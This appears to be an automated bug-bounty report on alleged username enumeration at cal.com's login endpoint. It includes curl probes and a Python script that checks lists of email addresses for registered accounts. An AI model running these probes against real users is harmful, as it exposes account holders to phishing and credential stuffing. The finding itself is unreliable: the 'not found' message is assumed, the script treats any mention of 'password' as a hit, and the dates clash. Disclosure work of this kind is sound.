# Username Enumeration via Distinct Error Messages on Login Endpoint

**Platform:** HackerOne | **Program:** cal.com
**Severity:** Medium | **CVSS:** 5.3 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**CWE:** CWE-204 — Observable Response Discrepancy
**OWASP:** A07:2021 — Identification and Authentication Failures
**Confidence:** High
**Detected:** 2026-03-26 | **Scan ID:** secbot-2026-03-26T08-17-21-602Z

---

## Summary

The `https://app.cal.com/auth/login` endpoint returns observably different responses depending on whether a submitted email address corresponds to a registered account. This allows an unauthenticated attacker to enumerate valid user email addresses on the platform at scale.

**Automated detection evidence:** Submitting `email=admin` to the login endpoint triggered a response containing the pattern `wrong password`, indicating the account exists but the password is incorrect. A non-existent email would return a different message (e.g., "no account found" or similar). Both responses share the same HTTP status code, making the discrepancy content-based.

---

## Steps to Reproduce

### Step 1 — Confirm the response discrepancy manually

**Request A — known/likely registered email:**
```bash
curl -s -X POST 'https://app.cal.com/auth/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=admin&password=wrongpassword123' \
  | grep -oi "wrong.*password\|incorrect.*password\|not.*found\|no.*account\|email.*not\|user.*not"
```

**Request B — clearly non-existent email:**
```bash
curl -s -X POST 'https://app.cal.com/auth/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=zxqnonexistent_secbot_probe_88473@example.com&password=wrongpassword123' \
  | grep -oi "wrong.*password\|incorrect.*password\|not.*found\|no.*account\|email.*not\|user.*not"
```

**Expected:** Request A returns a "wrong/incorrect password" message (account exists). Request B returns "no account" / "email not found" or produces a different error message — confirming the discrepancy.

### Step 2 — Enumerate valid accounts at scale

```python
import requests

# Example targets to probe (adjust to real email patterns)
probe_emails = [
    'admin@cal.com',
    'support@cal.com',
    'billing@cal.com',
    'test@gmail.com',
]

for email in probe_emails:
    r = requests.post(
        'https://app.cal.com/auth/login',
        data={'email': email, 'password': 'incorrect_probe_password'},
        allow_redirects=True
    )
    body = r.text.lower()
    if 'wrong' in body or 'incorrect' in body or 'password' in body:
        print(f"[EXISTS]   {email}")
    elif 'not found' in body or 'no account' in body:
        print(f"[MISSING]  {email}")
    else:
        print(f"[UNKNOWN]  {email}  ({len(body)} chars)")
```

---

## Impact

1. **Phishing enablement:** An attacker can build a confirmed list of registered email addresses and send targeted phishing emails impersonating cal.com (password resets, scheduling notifications, billing alerts).

2. **Credential stuffing amplification:** Combined with the missing rate limiting on the same endpoint (see companion report `2026-04-11-calcom-rate-limit-auth.md`), an attacker can first confirm valid accounts, then drive credential stuffing attacks using breached password databases — with zero friction from lockouts or throttling.

3. **Account profiling:** Corporate email pattern probing (e.g., `firstname.lastname@company.com`) reveals which employees use cal.com, a vector for supply chain / scheduling-based social engineering.

---

## Suggested Fix

Return a **uniform, non-disclosing error message** for both invalid password and unknown email:

```
"Invalid email or password. Please try again."
```

Implementation guidance:
- Apply at the application layer (not just the UI) so the HTTP response body is identical
- Normalize response timing — run password hashing even for unknown accounts to prevent timing side-channels
- Optionally, verify this is consistent across `/auth/login` and `/login` (both endpoints exist and may diverge)

---

## Notes for Triager

- Finding detected via automated content-comparison (SecBot v1.1.0, detection method: `content-comparison`)
- **Manual verification recommended** using the curl commands above before accepting — confirm both response bodies differ for registered vs unregistered emails
- No authentication required; fully unauthenticated attack
- Scan ran through Cloudflare WAF, which did not interfere with this check (no 403 responses observed on this endpoint)
- Companion finding: `2026-04-11-calcom-rate-limit-auth.md` — absence of rate limiting on the same endpoint significantly amplifies this finding's impact
